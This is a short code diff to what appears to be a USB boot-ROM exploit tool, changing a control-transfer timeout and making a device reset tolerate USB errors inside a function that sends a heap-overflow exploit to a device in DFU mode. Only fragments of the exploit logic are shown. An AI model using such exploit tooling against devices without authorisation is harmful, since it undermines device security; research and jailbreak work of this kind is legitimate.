@@ -97,7 +97,7 @@ def execute_securerom_payload(payload: bytes) -> None:
         device.dfu_upload_data(payload)
 
         dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xbb)
-        device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 1000)
+        device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 5000)
 
         _upload_data_to_force_timeout(device, exploit_info)
         # This should fail too
@@ -110,5 +110,8 @@ def execute_securerom_payload(payload: bytes) -> None:
         print(f'Sent exploit to overflow heap')
 
         # Reset the device and inform it there's a file ready to be processed
-        device.handle.reset()
+        try:
+            device.handle.reset()
+        except usb.core.USBError:
+            pass
         device.dfu_notify_upload_finished()
